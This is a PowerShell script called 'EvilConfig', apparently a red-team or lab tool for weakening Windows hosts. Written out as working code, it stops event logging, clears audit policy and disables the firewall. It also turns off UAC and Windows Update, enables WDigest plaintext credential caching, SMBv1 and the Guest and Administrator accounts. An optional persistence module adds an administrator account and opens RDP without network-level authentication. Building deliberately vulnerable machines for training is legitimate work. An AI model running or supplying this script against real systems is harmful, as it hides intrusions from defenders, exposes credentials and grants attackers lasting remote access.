# AUTHOR: Anna Pratt
# VERSION: 1.0
# DATED: May 2025

# Parse arguments from the command line when the script is invoked
$arg0=$args[0]
$arg1=$args[1]

# Define global variables
$global:logString = ""
$outFilePath = "./configs.txt"
$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

function defenseEvasion {

   $global:logString = $global:logString + "---------- DEFENSE EVASTION ----------`n"

    #Stop Windows Event logging and audit policy logging. Source https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/impair-defenses/disable-windows-event-logging
    try {
        Stop-Service -Name EventLog -Force -ErrorAction Stop
        $global:logString = $global:logString +  "Windows event logging disabled. `n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to stop Windows Event logging `n"
    }

    try {
        auditpol.exe /clear /y
        auditpol.exe  /remove /allusers
        $global:logString = $global:logString +  "Audit policy logging disabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to stop Audit policy logging. `n"
    }

    #Disable Firewall Logging for all Firewall profiles
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked False -LogAllowed False -LogIgnored False -ErrorAction Stop
        $global:logString = $global:logString +  "Firewall logging disabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to stop Firewall logging. `n"
    }

    # Disable all Firewall profiles
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
        $global:logString = $global:logString +  "Windows Firewall disabled. `n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to stop Windows Firewall. `n"
    }

}

function weakeningHost {
    $global:logString = $global:logString +  "---------- WEAKENING ---------- `n"

    #Set PowerShell policy to run any scripts from the internet (Unrestricted)
    try {
        Set-ExecutionPolicy Unrestricted -ErrorAction Stop
        $global:logString = $global:logString +  "PowerShell Exeuction Policy set to Unrestricted.1`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to change PowerShell execution policy to Unrestricted. `n"
    }

    #Disable UAC. Source https://github.com/nitroz3us/disable-windows-defender/blob/main/disable-windows-defender.ps1
    try {
        New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force -ErrorAction Stop
        $global:logString = $global:logString +  "UAC disabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to disable UAC. `n"
    }

    #Enable the default local users
    try {
        Get-LocalUser -Name "Administrator" | Enable-LocalUser -ErrorAction Stop
        $global:logString = $global:logString +  "Local Administrator user account enabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to enable Local Administrator account. `n"
    } 
    
    try {
        Get-LocalUser -Name "Guest" | Enable-LocalUser -ErrorAction Stop
        $global:logString = $global:logString +  "Local Guest user account enabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to enable Local Guest account. `n"
    }

    #Enable Wdigest for plain-text credential caching. Source https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/
    try {
        Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Stop
        $global:logString = $global:logString +  "Wdigest enabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to enable Wdigest. `n"
    }

    #Enable SMBv1
    try {
        Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -ErrorAction Stop
        $global:logString = $global:logString +  "SMBv1 enabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to enable SMBv1 `n"
    }

    #Enable Print Spooler
    try {
        Start-Service -Name spooler -ErrorAction Stop
        Set-Service -Name spooler -StartupType 'Automatic' -ErrorAction Stop
        $global:logString = $global:logString +  "Print spooler started, enabled on startup.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to enable PrintSpooler `n"
    }

    #Disable Windows Updates
    try {
        Set-Service wuauserv -Startup Disabled -ErrorAction Stop
        Stop-Service wuauserv -Force -ErrorAction Stop
        $global:logString = $global:logString +  "Windows Updates disabled.`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to disabled Windows updates. `n"
    }

}

function showHelp {
    # Show help if the user uses the --help flag
    Write-Output "------------------------------------- EVILCONFIG -------------------------------------"
    Write-Output "This version of EvilConfig was made and tested on PowerShell version 5.1.26100.4061."
    Write-Output "You may encounter errors if using an older version of PowerShell."
    Write-Output ""
    Write-Output "OPTIONAL FLAGS:"
    Write-Output "--persist: Execute the persistence module, which performs the following:"
    Write-Output "      - Adds a local user (non-privileged) and adds a local user (privileged). You will be prompted for the user's passwords upon creation."
    Write-Output "      - Adds both of the new users to the local RDP allowed group."
    Write-Output "      - Installs SSH client for remote access."
    Write-Output "      - Enables RDP. "
    Write-Output "A stable internet connection is needed for the persistence module."
    Write-Output ""
    Write-Output "--log: Creates a configs.txt in the local directory with a list of configuration changes applied."
    Write-Output ""
    Write-Output "--------------------------------------------------------------------------------------"

}

function persist {
# Execute the persistence module if the user adds the persistence flag
    $global:logString = $global:logString + "---------- PERSISTENCE ----------`n"

    #Gather credentials to create a non-privileged local account
    try {
        $localUserName  = Read-Host  "Enter the local (non-privileged) username: "
        $localPass = Read-Host -AsSecureString "Enter the local (non-privileged) password: "
        New-LocalUser -Name $localUserName -Password $localPass -ErrorAction Stop
        $global:logString = $global:logString + "Local (non-privileged) user added: " + $localUserName + "`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to add local (non-privileged) user.`n"
    }

    #Gather credentials to create a privileged local account
    try {
        $adminUserName = Read-Host "Enter the local privileged username: " 
        $adminPass = Read-Host -AsSecureString "Enter the local privileged password: " 
        New-LocalUser -Name $adminUserName -Password $adminPass -ErrorAction Stop
        $global:logString = $global:logString + "Local (privileged) user added: " + $adminUserName + "`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to add local (privileged) user. `n"
    }

    # Add the privileged user to the local Administrators account
    try {
        Add-LocalGroupMember -Group "Administrators" -Member $adminUserName -ErrorAction Stop
        $global:logString = $global:logString + "Local (privileged) user added to Administrators group: " + $localUserName + "`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to add local (privileged) user to Administrators group.`n"
    }

    ## Add both new users to the RDP allowed group
    try {
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $localUserName -ErrorAction Stop
        Add-LocalGroupMember -Group "Remote Desktop Users" -Member $adminUserName -ErrorAction Stop
        $global:logString = $global:logString +   "Local users added to RDP group:" +  $localUserName + "," +  $adminUserName + "`n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to add new local users to RDP group.`n"
    }

    # Install SSH client on the host
    try {
   Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 -ErrorAction Stop
    # Enable SSH service + modify the service to start automatically
   $global:logString = $global:logString +  "SSH client installed. `n"
    }
    catch {
        $global:logString = $global:logString +  "ERROR: Unable to install SSH client.`n"
    }

   #Enable RDP on the system
   # Registry keys taken from this Reddit thread: https://www.reddit.com/r/PowerShell/comments/8qbxn5/enabling_rdp/
   try {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 -ErrorAction Stop 
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0 -ErrorAction Stop  #Value 0 means RDP can be opened before authentication
    $global:logString = $global:logString +  "RDP enabled.`n"
   }
   catch {
    $global:logString = $global:logString +  "ERROR: Unable to enable RDP. `n"
   }
}


# Main Execution
$global:logString = $global:logString +  ".......... BEGINNING NEW CONFIG ............`n"
$global:logString = $global:logString +  "TIMESTAMP: " + $timestamp + "`n"

if ($arg0 -eq "--help") {
    showHelp
    Exit
}

defenseEvasion
weakeningHost

if ($arg0 -eq "--persist" -or $arg1 -eq "--persist" ) {

    persist
}

# Write Output logs
try {
    if ($arg0 -eq "--log" -or $arg1 -eq "--log" ) {
        if (Test-Path -Path $outFilePath) {
            Remove-Item $outFilePath
        }
        Add-Content -Path $outFilePath -Value $global:logString
    } 
}
catch {
    Write-Output "ERROR: Unable to log."
}

Exit